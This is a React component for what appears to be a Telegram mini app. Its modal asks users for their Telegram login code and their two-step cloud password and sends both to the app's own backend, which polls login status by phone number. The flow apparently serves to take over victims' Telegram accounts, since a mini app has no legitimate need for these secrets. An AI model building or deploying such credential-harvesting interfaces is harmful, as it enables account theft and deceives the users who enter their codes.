"use client"

import type React from "react"
import { useState, useEffect, useRef, useCallback } from "react"
import { X, Check, Loader2, Phone, Lock, RefreshCw, Shield, Clipboard } from "lucide-react"
import { useAuth } from "@/contexts/auth-context"
import { getTelegram, hapticFeedback } from "@/lib/telegram"

type AuthStep = "phone" | "telegram-code" | "2fa-password" | "success" | "error"

export function AuthModal() {
  const { isAuthModalOpen, closeAuthModal, loginWithCode, telegramUser } = useAuth()

  const [step, setStep] = useState<AuthStep>("phone")
  const [isLoading, setIsLoading] = useState(false)

  // ✅ iOS SAFE: один источник правды
  const [codeValue, setCodeValue] = useState("")

  const [phoneNumber, setPhoneNumber] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [statusMessage, setStatusMessage] = useState("")
  const [currentRequestId, setCurrentRequestId] = useState<string | null>(null)

  const hiddenInputRef = useRef<HTMLInputElement>(null)
  const passwordRef = useRef<HTMLInputElement>(null)
  const pollingRef = useRef<NodeJS.Timeout | null>(null)
  const mountedRef = useRef(true)
  const isCheckingPasswordRef = useRef(false)

  const telegramId = telegramUser?.id?.toString() || null

  /* -------------------- POLLING -------------------- */

  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current)
      pollingRef.current = null
    }
  }, [])

  const checkStatusWithAllParams = useCallback(async () => {
    try {
      const params = new URLSearchParams()
      if (currentRequestId) params.set("requestId", currentRequestId)
      if (telegramId) params.set("telegramId", telegramId)
      if (phoneNumber) params.set("phone", phoneNumber)

      const res = await fetch(`/api/telegram/check-status?${params}`)
      return await res.json()
    } catch {
      return null
    }
  }, [currentRequestId, telegramId, phoneNumber])

  const startPolling = useCallback(() => {
    stopPolling()

    pollingRef.current = setInterval(async () => {
      if (!mountedRef.current || isCheckingPasswordRef.current) return

      const data = await checkStatusWithAllParams()
      if (!data) return

      if (data.requestId && data.requestId !== currentRequestId) {
        setCurrentRequestId(data.requestId)
      }

      switch (data.status) {
        case "waiting_code":
          setStep("telegram-code")
          setStatusMessage(data.message || "Введите код из Telegram")
          setIsLoading(false)
          setTimeout(() => hiddenInputRef.current?.focus(), 200)
          break

        case "waiting_password":
          stopPolling()
          setStep("2fa-password")
          setStatusMessage(data.message || "Введите облачный пароль")
          setIsLoading(false)
          setTimeout(() => passwordRef.current?.focus(), 200)
          break

        case "success":
          stopPolling()
          setStep("success")
          setTimeout(closeAuthModal, 1500)
          break

        case "error":
          stopPolling()
          setError(data.error || "Ошибка авторизации")
          setStep("error")
          break
      }
    }, 1500)
  }, [checkStatusWithAllParams, currentRequestId, closeAuthModal, stopPolling])

  /* -------------------- LIFECYCLE -------------------- */

  useEffect(() => {
    mountedRef.current = true

    if (isAuthModalOpen) {
      setStep("phone")
      setCodeValue("")
      setPhoneNumber("")
      setPassword("")
      setError(null)
      setStatusMessage("")
      setCurrentRequestId(null)
      setIsLoading(false)
      isCheckingPasswordRef.current = false
    }

    return () => {
      mountedRef.current = false
      stopPolling()
    }
  }, [isAuthModalOpen, stopPolling])

  /* -------------------- CODE INPUT (iOS SAFE) -------------------- */

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5)
    setCodeValue(value)
    hapticFeedback("light")

    if (value.length === 5 && !isLoading) {
      submitCode(value)
    }
  }

  const handleCodePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5)
    if (!pasted) return

    setCodeValue(pasted)
    hapticFeedback("light")

    if (pasted.length === 5 && !isLoading) {
      submitCode(pasted)
    }
  }

  /* -------------------- AUTH -------------------- */

  const submitCode = async (code: string) => {
    if (isLoading || code.length !== 5) return

    setIsLoading(true)
    setError(null)
    isCheckingPasswordRef.current = true
    hapticFeedback("medium")

    try {
      const res = await fetch("/api/telegram/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "send_code",
          code,
          phone: phoneNumber,
          requestId: currentRequestId,
          telegramId,
        }),
      })

      const data = await res.json()

      if (data.status === "waiting_password") {
        setStep("2fa-password")
        setIsLoading(false)
        isCheckingPasswordRef.current = false
        setTimeout(() => passwordRef.current?.focus(), 200)
        return
      }

      if (data.status === "success") {
        setStep("success")
        await loginWithCode(code, currentRequestId || undefined)
        setTimeout(closeAuthModal, 1500)
        return
      }

      throw new Error()
    } catch {
      setError("Неверный код")
      setCodeValue("")
      setIsLoading(false)
      isCheckingPasswordRef.current = false
      setTimeout(() => hiddenInputRef.current?.focus(), 200)
    }
  }

  const submitPassword = async () => {
    if (!password.trim() || isLoading) return

    setIsLoading(true)
    setError(null)
    hapticFeedback("medium")

    try {
      const res = await fetch("/api/telegram/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "send_password",
          password,
          phone: phoneNumber,
          requestId: currentRequestId,
          telegramId,
        }),
      })

      const data = await res.json()

      if (data.success) {
        setStep("success")
        setTimeout(closeAuthModal, 1500)
      } else {
        throw new Error()
      }
    } catch {
      setError("Неверный пароль")
      setPassword("")
      setIsLoading(false)
      setTimeout(() => passwordRef.current?.focus(), 200)
    }
  }

  /* -------------------- UI -------------------- */

  if (!isAuthModalOpen) return null

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-sm">
      <div className="relative w-full max-w-sm bg-[#1a1a2e] rounded-2xl p-6 border border-white/10">

        <button onClick={closeAuthModal} className="absolute top-4 right-4 text-white/50">
          <X />
        </button>

        {step === "telegram-code" && (
          <div className="space-y-6 text-center">

            <input
              ref={hiddenInputRef}
              type="tel"
              inputMode="numeric"
              value={codeValue}
              onChange={handleCodeChange}
              onPaste={handleCodePaste}
              maxLength={5}
              autoComplete="one-time-code"
              className="absolute opacity-0 pointer-events-none"
              disabled={isLoading}
            />

            <div
              className="flex justify-center gap-2 cursor-text"
              onClick={() => hiddenInputRef.current?.focus()}
            >
              {[0,1,2,3,4].map(i => {
                const digit = codeValue[i]
                const active = i === codeValue.length

                return (
                  <div
                    key={i}
                    className={`w-12 h-14 flex items-center justify-center text-xl font-bold border-2 rounded-lg text-white ${
                      digit
                        ? "border-[#00ccff] bg-[#00ccff]/10"
                        : active
                          ? "border-[#00ccff]"
                          : "border-[#00ccff]/40"
                    }`}
                  >
                    {digit || (active ? <span className="animate-pulse">|</span> : "")}
                  </div>
                )
              })}
            </div>

            {statusMessage && <p className="text-white/50 text-xs">{statusMessage}</p>}
            {error && <p className="text-red-400 text-sm">{error}</p>}

            {isLoading && (
              <div className="flex justify-center gap-2 text-white/60">
                <Loader2 className="w-4 h-4 animate-spin" />
                Проверяем...
              </div>
            )}

            <p className="text-white/40 text-xs flex justify-center gap-1">
              <Clipboard className="w-4 h-4" />
              Можно вставить код
            </p>
          </div>
        )}

        {step === "2fa-password" && (
          <div className="space-y-4 text-center">
            <input
              ref={passwordRef}
              type="password"
              value={password}
              onChange={e => setPassword(e.target.value)}
              onKeyDown={e => e.key === "Enter" && submitPassword()}
              className="w-full p-3 rounded-xl bg-transparent border border-[#ff0066] text-white"
              placeholder="Пароль"
            />
            {error && <p className="text-red-400">{error}</p>}
            <button
              onClick={submitPassword}
              disabled={isLoading}
              className="w-full py-3 bg-[#ff0066] rounded-xl text-white"
            >
              {isLoading ? "Проверяем..." : "Подтвердить"}
            </button>
          </div>
        )}

        {step === "success" && (
          <div className="text-center space-y-4">
            <Check className="mx-auto text-green-400 w-10 h-10" />
            <p className="text-white">Успешно</p>
          </div>
        )}

      </div>
    </div>
  )
}
